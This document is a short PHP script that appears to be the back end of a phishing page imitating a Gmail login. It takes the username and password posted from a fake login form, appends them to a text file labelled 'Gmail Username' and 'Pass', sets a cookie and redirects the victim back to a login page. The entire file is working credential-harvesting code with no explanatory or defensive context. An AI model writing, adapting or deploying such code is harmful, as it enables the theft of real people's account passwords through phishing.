<?php
$a = $_POST['username'];
setcookie("name", "$a", time()+10, "/", "", 0);
file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: ../login.php#c');
exit();
?>